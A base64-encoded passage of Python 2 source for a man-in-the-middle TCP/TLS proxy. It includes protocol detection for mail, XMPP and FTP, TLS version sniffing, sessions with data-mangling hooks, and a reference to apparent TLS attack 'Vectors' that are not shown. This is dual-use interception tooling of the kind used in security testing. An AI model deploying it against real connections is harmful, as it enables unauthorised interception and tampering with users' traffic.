ICAgICAgICAgIGNodW5rID0gc2VsZi5zb2NrZXRfc3NsLnJlYWQoZGF0YV9wZW5kaW5nKQ0KICAgICAgICAgICAgICAgIGNodW5rcy5hcHBlbmQoY2h1bmspDQogICAgICAgICAgICAgICAgZGF0YV9wZW5kaW5nID0gc2VsZi5zb2NrZXRfc3NsLnBlbmRpbmcoKQ0KICAgICAgICAgICAgc2VsZi5yZWN2YnVmID0gJycuam9pbihjaHVua3MpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzZWxmLnJlY3ZidWYgPSBzZWxmLnNvY2tldC5yZWN2KGJ1ZmxlbiwgKmFyZ3MsICoqa3dhcmdzKQ0KICAgICAgICByZXR1cm4gc2VsZi5yZWN2YnVmDQogICAgDQogICAgZGVmIHJlY3ZfYmxvY2tlZChzZWxmLCBidWZsZW49OCoxMDI0LCB0aW1lb3V0PU5vbmUsICphcmdzLCAqKmt3YXJncyk6DQogICAgICAgIGZvcmNlX2ZpcnN0X2xvb3BfaXRlcmF0aW9uID0gVHJ1ZQ0KICAgICAgICBlbmQgPSB0aW1lLnRpbWUoKSt0aW1lb3V0IGlmIHRpbWVvdXQgZWxzZSAwDQogICAgICAgIHdoaWxlIGZvcmNlX2ZpcnN0X2xvb3BfaXRlcmF0aW9uIG9yIChub3QgdGltZW91dCBvciB0aW1lLnRpbWUoKTxlbmQpOg0KICAgICAgICAgICAgIyBmb3JjZSBvbmUgcmVjdiBvdGhlcndpc2Ugd2UgbWlnaHQgbm90IGV2ZW4gdHJ5IHRvIHJlYWQgaWYgdGltZW91dCBpcyB0b28gbmFycm93DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIHNlbGYucmVjdihidWZsZW49YnVmbGVuLCAqYXJncywgKiprd2FyZ3MpDQogICAgICAgICAgICBleGNlcHQgc3NsLlNTTFdhbnRSZWFkRXJyb3I6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgZm9yY2VfZmlyc3RfbG9vcF9pdGVyYXRpb24gPSBGYWxzZQ0KIA0KICAgIGRlZiBzZW5kKHNlbGYsIGRhdGEsIHJldHJhbnNtaXRfZGVsYXk9MC4xKToNCiAgICAgICAgaWYgc2VsZi5zb2NrZXRfc3NsOg0KICAgICAgICAgICAgbGFzdF9leGNlcHRpb24gPSBOb25lDQogICAgICAgICAgICBmb3IgXyBpbiB4cmFuZ2UoMyk6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBzZWxmLnNvY2tldF9zc2wud3JpdGUoZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgbGFzdF9leGNlcHRpb24gPSBOb25lDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZXhjZXB0IHNzbC5TU0xXYW50V3JpdGVFcnJvcixzd3dlOg0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIud2FybmluZygiVENQU29ja0J1ZmY6IHNzbC5zb2NrIG5vdCB5ZXQgcmVhZHksIHJldHJhbnNtaXQgKCVkKSBpbiAlZiBzZWNvbmRzOiAlcyIlKF8scmV0cmFuc21pdF9kZWxheSxyZXByKHN3d2UpKSkNCiAgICAgICAgICAgICAgICAgICAgbGFzdF9leGNlcHRpb24gPSBzd3dlDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChyZXRyYW5zbWl0X2RlbGF5KQ0KICAgICAgICAgICAgaWYgbGFzdF9leGNlcHRpb246DQogICAgICAgICAgICAgICAgcmFpc2UgbGFzdF9leGNlcHRpb24NCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHNlbGYuc29ja2V0LnNlbmQoZGF0YSkNCiAgICAgICAgc2VsZi5zbmRidWYgPSBkYXRhDQogICAgICAgIA0KICAgIGRlZiBzZW5kYWxsKHNlbGYsIGRhdGEpOg0KICAgICAgICBpZiBzZWxmLnNvY2tldF9zc2w6DQogICAgICAgICAgICBzZWxmLnNlbmQoZGF0YSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHNlbGYuc29ja2V0LnNlbmRhbGwoZGF0YSkNCiAgICAgICAgc2VsZi5zbmRidWYgPSBkYXRhDQogICAgICAgIA0KICAgIGRlZiBzc2xfd3JhcF9zb2NrZXQoc2VsZiwgKmFyZ3MsICoqa3dhcmdzKToNCiAgICAgICAgaWYgbGVuKGFyZ3MpPj0xOg0KICAgICAgICAgICAgYXJnc1sxXSA9IHNlbGYuc29ja2V0DQogICAgICAgIGlmICdzb2NrJyBpbiBrd2FyZ3M6DQogICAgICAgICAgICBrd2FyZ3NbJ3NvY2snXSA9IHNlbGYuc29ja2V0DQogICAgICAgIGlmIG5vdCBhcmdzIGFuZCBub3Qga3dhcmdzLmdldCgnc29jaycpOg0KICAgICAgICAgICAga3dhcmdzWydzb2NrJ10gPSBzZWxmLnNvY2tldA0KICAgICAgICBzZWxmLnNvY2tldF9zc2wgPSBzc2wud3JhcF9zb2NrZXQoKmFyZ3MsICoqa3dhcmdzKQ0KICAgICAgICBzZWxmLnNvY2tldF9zc2wuc2V0YmxvY2tpbmcoMCkgIyBub25ibG9ja2luZyBmb3Igc2VsZWN0DQogICAgDQogICAgZGVmIHNzbF93cmFwX3NvY2tldF93aXRoX2NvbnRleHQoc2VsZiwgY3R4LCAqYXJncywgKiprd2FyZ3MpOg0KICAgICAgICBpZiBsZW4oYXJncyk+PTE6DQogICAgICAgICAgICBhcmdzWzFdID0gc2VsZi5zb2NrZXQNCiAgICAgICAgaWYgJ3NvY2snIGluIGt3YXJnczoNCiAgICAgICAgICAgIGt3YXJnc1snc29jayddID0gc2VsZi5zb2NrZXQNCiAgICAgICAgaWYgbm90IGFyZ3MgYW5kIG5vdCBrd2FyZ3MuZ2V0KCdzb2NrJyk6DQogICAgICAgICAgICBrd2FyZ3NbJ3NvY2snXSA9IHNlbGYuc29ja2V0DQogICAgICAgIHNlbGYuc29ja2V0X3NzbCA9IGN0eC53cmFwX3NvY2tldCgqYXJncywgKiprd2FyZ3MpDQogICAgICAgIHNlbGYuc29ja2V0X3NzbC5zZXRibG9ja2luZygwKSAjIG5vbmJsb2NraW5nIGZvciBzZWxlY3QNCiAgICAgICAgDQpjbGFzcyBQcm90b2NvbERldGVjdChvYmplY3QpOg0KICAgIFBST1RPX1NNVFAgPSAyNQ0KICAgIFBST1RPX1hNUFAgPSA1MjIyDQogICAgUFJPVE9fSU1BUCA9IDE0Mw0KICAgIFBST1RPX0ZUUCA9IDIxDQogICAgUFJPVE9fUE9QMyA9IDExMA0KICAgIFBST1RPX05OVFAgPSAxMTkNCiAgICBQUk9UT19JUkMgPSA2NjY3DQogICAgUFJPVE9fQUNBUCA9IDY3NQ0KICAgIFBST1RPX1NTTCA9IDQ0Mw0KIA0KICAgIFBPUlRNQVAgPSB7MjU6ICBQUk9UT19TTVRQLA0KICAgICAgICAgICAgICAgNTIyMjpQUk9UT19YTVBQLA0KICAgICAgICAgICAgICAgMTEwOiBQUk9UT19QT1AzLA0KICAgICAgICAgICAgICAgMTQzOiBQUk9UT19JTUFQLA0KICAgICAgICAgICAgICAgMjE6IFBST1RPX0ZUUCwNCiAgICAgICAgICAgICAgIDExOTogUFJPVE9fTk5UUCwNCiAgICAgICAgICAgICAgIDY2Njc6IFBST1RPX0lSQywNCiAgICAgICAgICAgICAgIDY3NTogUFJPVE9fQUNBUA0KICAgICAgICAgICAgICAgfQ0KICAgIA0KICAgIEtFWVdPUkRTID0gKChbJ2VobG8nLCAnaGVsbycsJ3N0YXJ0dGxzJywncmNwdCB0bzonLCdtYWlsIGZyb206J10sIFBST1RPX1NNVFApLA0KICAgICAgICAgICAgICAgIChbJ3htcHAnXSwgUFJPVE9fWE1QUCksDQogICAgICAgICAgICAgICAgKFsnLiBjYXBhYmlsaXR5J10sIFBST1RPX0lNQVApLA0KICAgICAgICAgICAgICAgIChbJ2F1dGggdGxzJ10sIFBST1RPX0ZUUCkNCiAgICAgICAgICAgICAgICApDQogICAgDQogICAgZGVmIF9faW5pdF9fKHNlbGYsIHRhcmdldD1Ob25lKToNCiAgICAgICAgc2VsZi5wcm90b2NvbF9pZCA9IE5vbmUNCiAgICAgICAgc2VsZi5oaXN0b3J5ID0gW10NCiAgICAgICAgaWYgdGFyZ2V0Og0KICAgICAgICAgICAgc2VsZi5wcm90b2NvbF9pZCA9IHNlbGYuUE9SVE1BUC5nZXQodGFyZ2V0WzFdKQ0KICAgICAgICAgICAgaWYgc2VsZi5wcm90b2NvbF9pZDoNCiAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIC0gcHJvdG9jb2wgZGV0ZWN0ZWQgKHRhcmdldCBwb3J0KSIlcmVwcihzZWxmKSkNCiAgICANCiAgICBkZWYgX19zdHJfXyhzZWxmKToNCiAgICAgICAgcmV0dXJuIHJlcHIoc2VsZi5wcm90b19pZF90b19uYW1lKHNlbGYucHJvdG9jb2xfaWQpKQ0KICAgIA0KICAgIGRlZiBfX3JlcHJfXyhzZWxmKToNCiAgICAgICAgcmV0dXJuICI8UHJvdG9jb2xEZXRlY3QgJXMgcHJvdG9jb2xfaWQ9JXMgbGVuX2hpc3Rvcnk9JWQ+IiUoaGV4KGlkKHNlbGYpKSwgc2VsZi5wcm90b19pZF90b19uYW1lKHNlbGYucHJvdG9jb2xfaWQpLCBsZW4oc2VsZi5oaXN0b3J5KSkNCiAgICAgICAgICAgIA0KICAgIGRlZiBwcm90b19pZF90b19uYW1lKHNlbGYsIGlkKToNCiAgICAgICAgaWYgbm90IGlkOg0KICAgICAgICAgICAgcmV0dXJuIGlkDQogICAgICAgIGZvciBwIGluIChhIGZvciBhIGluIGRpcihzZWxmKSBpZiBhLnN0YXJ0c3dpdGgoIlBST1RPXyIpKToNCiAgICAgICAgICAgIGlmIGdldGF0dHIoc2VsZiwgcCk9PWlkOg0KICAgICAgICAgICAgICAgIHJldHVybiBwICAgDQoNCiAgICBkZWYgZGV0ZWN0X3BlZWtfdGxzKHNlbGYsIHNvY2spOg0KICAgICAgICBpZiBzb2NrLnNvY2tldF9zc2w6DQogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oIlNTTCBEZXRlY3Rpb24gZm9yIHNzbCBzb2NrZXQgLi53aHV0ISIpDQogICAgICAgIFRMU19WRVJTSU9OUyA9IHsNCiAgICAgICAgICAgICMgU1NMDQogICAgICAgICAgICAnAAInOiJTU0xfMl8wIiwNCiAgICAgICAgICAgICcDACc6IlNTTF8zXzAiLA0KICAgICAgICAgICAgIyBUTFMNCiAgICAgICAgICAgICcDASc6IlRMU18xXzAiLA0KICAgICAgICAgICAgJwMCJzoiVExTXzFfMSIsDQogICAgICAgICAgICAnAwMnOiJUTFNfMV8yIiwNCiAgICAgICAgICAgICcDBCc6IlRMU18xXzMiLA0KICAgICAgICAgICAgfQ0KICAgICAgICBUTFNfQ09OVEVOVF9UWVBFX0hBTkRTSEFLRSA9ICcWJw0KICAgICAgICBTU0x2Ml9QUkVBTUJMRSA9IDB4ODANCiAgICAgICAgU1NMdjJfQ09OVEVOVF9UWVBFX0NMSUVOVF9IRUxMTyA9JwEnDQogICAgICAgIA0KICAgICAgICBwZWVrX2J5dGVzID0gc29jay5yZWN2KDUsIHNvY2tldC5NU0dfUEVFSykNCiAgICAgICAgaWYgbm90IGxlbihwZWVrX2J5dGVzKT09NToNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICAjIGRldGVjdCBzc2x2Miwgc3NsdjMsIHRsczogb25lIHN5bWJvbCBpcyBvbmUgYnl0ZTsgIFQgLi4gdHlwZQ0KICAgICAgICAjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEwgLi4gbGVuZ3RoIA0KICAgICAgICAjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFYgLi4gdmVyc2lvbg0KICAgICAgICAjICAgICAgICAgICAgICAgMDEyMzQNCiAgICAgICAgIyBkZXRlY3Qgc3NsdjIgIExMVFZWICAgICAgICAgICAgICAgIFQ9MHgwMSAuLi4gTWVzc2FnZVR5cGUuY2xpZW50X2hlbGxvOyBMIGhpZ2ggYml0IHNldC4NCiAgICAgICAgIyAgICAgICAgc3NsdjMgIFRWVkxMICAgICAgDQogICAgICAgICMgICAgICAgIHRscyAgICBUVlZMTCAgICAgICAgICAgICAgICBUPTB4MTYgLi4uIENvbnRlbnRUeXBlLkhhbmRzaGFrZQ0KICAgICAgICB2ID0gTm9uZQ0KICAgICAgICBpZiBvcmQocGVla19ieXRlc1swXSkgJiBTU0x2Ml9QUkVBTUJMRSBcDQogICAgICAgICAgICBhbmQgcGVla19ieXRlc1syXT09U1NMdjJfQ09OVEVOVF9UWVBFX0NMSUVOVF9IRUxMTyBcDQogICAgICAgICAgICBhbmQgcGVla19ieXRlc1szOjMrMl0gaW4gVExTX1ZFUlNJT05TLmtleXMoKToNCiAgICAgICAgICAgIHYgPSBUTFNfVkVSU0lPTlMuZ2V0KHBlZWtfYnl0ZXNbMzozKzJdKQ0KICAgICAgICAgICAgbG9nZ2VyLmluZm8oIlByb3RvY29sRGV0ZWN0OiBTU0wyMy9UTFMgdmVyc2lvbjogJXMiJXYpDQogICAgICAgIGVsaWYgcGVla19ieXRlc1swXSA9PSBUTFNfQ09OVEVOVF9UWVBFX0hBTkRTSEFLRSBcDQogICAgICAgICAgICBhbmQgcGVla19ieXRlc1sxOjErMl0gaW4gVExTX1ZFUlNJT05TLmtleXMoKToNCiAgICAgICAgICAgIHYgPSBUTFNfVkVSU0lPTlMuZ2V0KHBlZWtfYnl0ZXNbMToxKzJdKSAgDQogICAgICAgICAgICBsb2dnZXIuaW5mbygiUHJvdG9jb2xEZXRlY3Q6IFRMUyB2ZXJzaW9uOiAlcyIldikNCiAgICAgICAgcmV0dXJuIHYNCiAgICAgICAgICAgIA0KDQogICAgZGVmIGRldGVjdChzZWxmLCBkYXRhKToNCiAgICAgICAgaWYgc2VsZi5wcm90b2NvbF9pZDoNCiAgICAgICAgICAgIHJldHVybiBzZWxmLnByb3RvY29sX2lkDQogICAgICAgIHNlbGYuaGlzdG9yeS5hcHBlbmQoZGF0YSkNCiAgICAgICAgZm9yIGtleXdvcmRsaXN0LHByb3RvIGluIHNlbGYuS0VZV09SRFM6DQogICAgICAgICAgICBpZiBhbnkoayBpbiBkYXRhLmxvd2VyKCkgZm9yIGsgaW4ga2V5d29yZGxpc3QpOg0KICAgICAgICAgICAgICAgIHNlbGYucHJvdG9jb2xfaWQgPSBwcm90bw0KICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgLSBwcm90b2NvbCBkZXRlY3RlZCAocHJvdG9jb2wgbWVzc2FnZXMpIiVyZXByKHNlbGYpKQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICANCmNsYXNzIFNlc3Npb24ob2JqZWN0KToNCiAgICAnJycgUHJveHkgc2Vzc2lvbiBmcm9tIGNsaWVudCA8LT4gcHJveHkgPC0+IHNlcnZlciANCiAgICAgICAgQHBhcmFtIGluYm91bmQ6IGluYm91bmQgc29ja2V0DQogICAgICAgIEBwYXJhbSBvdXRib3VuZDogb3V0Ym91bmQgc29ja2V0DQogICAgICAgIEBwYXJhbSB0YXJnZXQ6IHRhcmdldCB0dXBsZSAoJ2lwJyxwb3J0KSANCiAgICAgICAgQHBhcmFtIGJ1ZmZlcl9zaXplOiBzb2NrZXQgYnVmZiBzaXplJycnDQogICAgDQogICAgZGVmIF9faW5pdF9fKHNlbGYsIHByb3h5LCBpbmJvdW5kPU5vbmUsIG91dGJvdW5kPU5vbmUsIHRhcmdldD1Ob25lLCBidWZmZXJfc2l6ZT00MDk2KToNCiAgICAgICAgc2VsZi5wcm94eSA9IHByb3h5DQogICAgICAgIHNlbGYuYmluZCA9IHByb3h5LmdldHNvY2tuYW1lKCkNCiAgICAgICAgc2VsZi5pbmJvdW5kID0gVGNwU29ja0J1ZmYoaW5ib3VuZCkNCiAgICAgICAgc2VsZi5vdXRib3VuZCA9IFRjcFNvY2tCdWZmKG91dGJvdW5kLCBwZWVyPXRhcmdldCkNCiAgICAgICAgc2VsZi5idWZmZXJfc2l6ZSA9IGJ1ZmZlcl9zaXplDQogICAgICAgIHNlbGYucHJvdG9jb2wgPSBQcm90b2NvbERldGVjdCh0YXJnZXQ9dGFyZ2V0KQ0KICAgICAgICBzZWxmLmRhdGFzdG9yZSA9IHt9DQogICAgDQogICAgZGVmIF9fcmVwcl9fKHNlbGYpOg0KICAgICAgICByZXR1cm4gIjxTZXNzaW9uICVzIFtjbGllbnQ6ICVzXSAtLT4gW3ByeHk6ICVzXSAtLT4gW3RhcmdldDogJXNdPiIlKGhleChpZChzZWxmKSksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5pbmJvdW5kLnBlZXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iaW5kLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYub3V0Ym91bmQucGVlcikNCiAgICBkZWYgX19zdHJfXyhzZWxmKToNCiAgICAgICAgcmV0dXJuICI8U2Vzc2lvbiAlcz4iJWhleChpZChzZWxmKSkNCiAgICAgICAgDQogICAgZGVmIGNvbm5lY3Qoc2VsZiwgdGFyZ2V0KToNCiAgICAgICAgc2VsZi5vdXRib3VuZC5wZWVyID0gdGFyZ2V0DQogICAgICAgIGxvZ2dlci5pbmZvKCIlcyBjb25uZWN0aW5nIHRvIHRhcmdldCAlcyIlKHNlbGYsIHJlcHIodGFyZ2V0KSkpDQogICAgICAgIHJldHVybiBzZWxmLm91dGJvdW5kLmNvbm5lY3QodGFyZ2V0KQ0KICAgIA0KICAgIGRlZiBhY2NlcHQoc2VsZik6DQogICAgICAgIHNvY2ssIGFkZHIgPSBzZWxmLnByb3h5LmFjY2VwdCgpDQogICAgICAgIHNlbGYuaW5ib3VuZCA9IFRjcFNvY2tCdWZmKHNvY2spDQogICAgICAgIHNlbGYuaW5ib3VuZC5wZWVyID0gYWRkcg0KICAgICAgICBsb2dnZXIuaW5mbygiJXMgY2xpZW50ICVzIGhhcyBjb25uZWN0ZWQiJShzZWxmLHJlcHIoc2VsZi5pbmJvdW5kLnBlZXIpKSkNCiAgICAgICAgcmV0dXJuIHNvY2ssYWRkcg0KICAgIA0KICAgIGRlZiBnZXRfcGVlcl9zb2NrZXRzKHNlbGYpOg0KICAgICAgICByZXR1cm4gW3NlbGYuaW5ib3VuZC5zb2NrZXQsIHNlbGYub3V0Ym91bmQuc29ja2V0XQ0KICAgIA0KICAgIGRlZiBub3RpZnlfcmVhZChzZWxmLCBzb2NrKToNCiAgICAgICAgaWYgc29jayA9PSBzZWxmLnByb3h5Og0KICAgICAgICAgICAgc2VsZi5hY2NlcHQoKQ0KICAgICAgICAgICAgc2VsZi5jb25uZWN0KHNlbGYub3V0Ym91bmQucGVlcikNCiAgICAgICAgZWxpZiBzb2NrID09IHNlbGYuaW5ib3VuZC5zb2NrZXQ6DQogICAgICAgICAgICAjIG5ldyBjbGllbnQgLT4gcHJ4eSAtIGRhdGENCiAgICAgICAgICAgIHNlbGYub25fcmVjdl9wZWVrKHNlbGYuaW5ib3VuZCwgc2VsZikNCiAgICAgICAgICAgIHNlbGYub25fcmVjdihzZWxmLmluYm91bmQsIHNlbGYub3V0Ym91bmQsIHNlbGYpDQogICAgICAgIGVsaWYgc29jayA9PSBzZWxmLm91dGJvdW5kLnNvY2tldDoNCiAgICAgICAgICAgICMgbmV3IHNwcnh5IDwtIHRhcmdldCAtIGRhdGENCiAgICAgICAgICAgIHNlbGYub25fcmVjdihzZWxmLm91dGJvdW5kLCBzZWxmLmluYm91bmQsIHNlbGYpDQogICAgICAgIHJldHVybiANCiAgICANCiAgICBkZWYgY2xvc2Uoc2VsZik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHNlbGYub3V0Ym91bmQuc29ja2V0LnNodXRkb3duKDIpDQogICAgICAgICAgICBzZWxmLm91dGJvdW5kLnNvY2tldC5jbG9zZSgpDQogICAgICAgICAgICBzZWxmLmluYm91bmQuc29ja2V0LnNodXRkb3duKDIpDQogICAgICAgICAgICBzZWxmLmluYm91bmQuc29ja2V0LmNsb3NlKCkNCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvciwgc2U6DQogICAgICAgICAgICBsb2dnZXIud2FybmluZygic2Vzc2lvbi5jbG9zZSgpOiBFeGNlcHRpb246ICVzIiVyZXByKHNlKSkNCiAgICAgICAgcmFpc2UgU2Vzc2lvblRlcm1pbmF0ZWRFeGNlcHRpb24oKQ0KICAgIA0KICAgIGRlZiBvbl9yZWN2KHNlbGYsIHNfaW4sIHNfb3V0LCBzZXNzaW9uKToNCiAgICAgICAgZGF0YSA9IHNfaW4ucmVjdihzZXNzaW9uLmJ1ZmZlcl9zaXplKQ0KICAgICAgICBzZWxmLnByb3RvY29sLmRldGVjdChkYXRhKQ0KICAgICAgICBpZiBub3QgbGVuKGRhdGEpOg0KICAgICAgICAgICAgcmV0dXJuIHNlc3Npb24uY2xvc2UoKQ0KICAgICAgICBpZiBzX2luID09IHNlc3Npb24uaW5ib3VuZDoNCiAgICAgICAgICAgIGRhdGEgPSBzZWxmLm1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhKQ0KICAgICAgICBlbGlmIHNfaW4gPT0gc2Vzc2lvbi5vdXRib3VuZDoNCiAgICAgICAgICAgIGRhdGEgPSBzZWxmLm1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhKQ0KICAgICAgICBpZiBkYXRhOg0KICAgICAgICAgICAgc19vdXQuc2VuZGFsbChkYXRhKQ0KICAgICAgICByZXR1cm4gZGF0YQ0KICAgIA0KICAgIGRlZiBvbl9yZWN2X3BlZWsoc2VsZiwgc19pbiwgc2Vzc2lvbik6IHBhc3MNCiAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlbGYsIHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOiByZXR1cm4gZGF0YQ0KICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2VsZiwgc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6IHJldHVybiBkYXRhDQogICAgDQpjbGFzcyBQcm94eVNlcnZlcihvYmplY3QpOg0KICAgICcnJ1Byb3h5IENsYXNzJycnDQogICAgDQogICAgZGVmIF9faW5pdF9fKHNlbGYsIGxpc3RlbiwgdGFyZ2V0LCBidWZmZXJfc2l6ZT00MDk2LCBkZWxheT0wLjAwMDEpOg0KICAgICAgICBzZWxmLmlucHV0X2xpc3QgPSBzZXQoW10pDQogICAgICAgIHNlbGYuc2Vzc2lvbnMgPSB7fSAgIyBzb2NrOlNlc3Npb24oKQ0KICAgICAgICBzZWxmLmNhbGxiYWNrcyA9IHt9ICMgbmFtZTogW2YsLi5dDQogICAgICAgICMNCiAgICAgICAgc2VsZi5saXN0ZW4gPSBsaXN0ZW4NCiAgICAgICAgc2VsZi50YXJnZXQgPSB0YXJnZXQNCiAgICAgICAgIw0KICAgICAgICBzZWxmLmJ1ZmZlcl9zaXplID0gYnVmZmVyX3NpemUNCiAgICAgICAgc2VsZi5kZWxheSA9IGRlbGF5DQogICAgICAgIHNlbGYuYmluZCA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgICAgICAgc2VsZi5iaW5kLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQsIHNvY2tldC5TT19SRVVTRUFERFIsIDEpDQogICAgICAgIHNlbGYuYmluZC5iaW5kKGxpc3RlbikNCiAgICAgICAgc2VsZi5iaW5kLmxpc3RlbigyMDApDQogICAgICAgIA0KICAgIGRlZiBfX3N0cl9fKHNlbGYpOg0KICAgICAgICByZXR1cm4gIjxQcm94eSAlcyBsaXN0ZW49JXMgdGFyZ2V0PSVzPiIlKGhleChpZChzZWxmKSksc2VsZi5saXN0ZW4sIHNlbGYudGFyZ2V0KQ0KDQogICAgZGVmIGdldF9zZXNzaW9uX2J5X2NsaWVudF9zb2NrKHNlbGYsIHNvY2spOg0KICAgICAgICByZXR1cm4gc2VsZi5zZXNzaW9ucy5nZXQoc29jaykNCg0KICAgIGRlZiBzZXRfY2FsbGJhY2soc2VsZiwgbmFtZSwgZik6DQogICAgICAgIHNlbGYuY2FsbGJhY2tzW25hbWVdID0gZg0KDQogICAgZGVmIG1haW5fbG9vcChzZWxmKToNCiAgICAgICAgc2VsZi5pbnB1dF9saXN0LmFkZChzZWxmLmJpbmQpDQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICB0aW1lLnNsZWVwKHNlbGYuZGVsYXkpDQogICAgICAgICAgICBpbnB1dHJlYWR5LCBfLCBfID0gIHNlbGVjdC5zZWxlY3Qoc2VsZi5pbnB1dF9saXN0LCBbXSwgW10pDQogICAgICAgICAgICANCiAgICAgICAgICAgIGZvciBzb2NrIGluIGlucHV0cmVhZHk6DQogICAgICAgICAgICAgICAgaWYgbm90IHNvY2sgaW4gc2VsZi5pbnB1dF9saXN0OiANCiAgICAgICAgICAgICAgICAgICAgIyBDaGVjayBpZiBpbnB1dHJlYWR5IHNvY2sgaXMgc3RpbGwgaW4gdGhlIGxpc3Qgb2Ygc29ja3MgdG8gcmVhZCBmcm9tDQogICAgICAgICAgICAgICAgICAgICMgYXMgU2Vzc2lvblRlcm1pbmF0ZUV4Y2VwdGlvbiBtaWdodCByZW1vdmUgbXVsdGlwbGUgc29ja2V0cyBmcm9tIHRoYXQgbGlzdA0KICAgICAgICAgICAgICAgICAgICAjIHRoaXMgbWlnaHQgb3RoZXJ3aXNlIGxlYWQgdG8gYmFkIEZEIGFjY2VzcyBleGNlcHRpb25zDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgc2Vzc2lvbiA9IE5vbmUNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGlmIHNvY2sgPT0gc2VsZi5iaW5kOg0KICAgICAgICAgICAgICAgICAgICAgICAgIyBvbl9hY2NlcHQNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb24gPSBTZXNzaW9uKHNvY2ssIHRhcmdldD1zZWxmLnRhcmdldCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBrLHYgaW4gc2VsZi5jYWxsYmFja3MuaXRlcml0ZW1zKCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2V0YXR0cihzZXNzaW9uLCBrLCB2KQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5ub3RpZnlfcmVhZChzb2NrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHMgaW4gc2Vzc2lvbi5nZXRfcGVlcl9zb2NrZXRzKCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZXNzaW9uc1tzXT1zZXNzaW9uDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmlucHV0X2xpc3QudXBkYXRlKHNlc3Npb24uZ2V0X3BlZXJfc29ja2V0cygpKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgIyBvbl9yZWN2DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbiA9IHNlbGYuZ2V0X3Nlc3Npb25fYnlfY2xpZW50X3NvY2soc29jaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLm5vdGlmeV9yZWFkKHNvY2spDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgc3NsLlNTTEVycm9yLCBzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzZS5lcnJubyAhPSBzc2wuU1NMX0VSUk9SX1dBTlRfUkVBRDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFNlc3Npb25UZXJtaW5hdGVkRXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaW5wdXRfbGlzdC5kaWZmZXJlbmNlX3VwZGF0ZShzZXNzaW9uLmdldF9wZWVyX3NvY2tldHMoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dnZXIud2FybmluZygiJXMgdGVybWluYXRlZC4iJXNlc3Npb24pDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZToNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmVycm9yKCJtYWluOiAlcyIlcmVwcihlKSkNCiAgICAgICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShlLElPRXJyb3IpOg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGtuYW1lLHZhbHVlIGluICgoYSxnZXRhdHRyKFZlY3RvcnMsYSkpIGZvciBhIGluIGRpcihWZWN0b3JzKSBpZiBhLnN0YXJ0c3dpdGgoIl9UTFNfIikpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZSh2YWx1ZSk6DQogICAgICAgICAgICAgICAgICAgI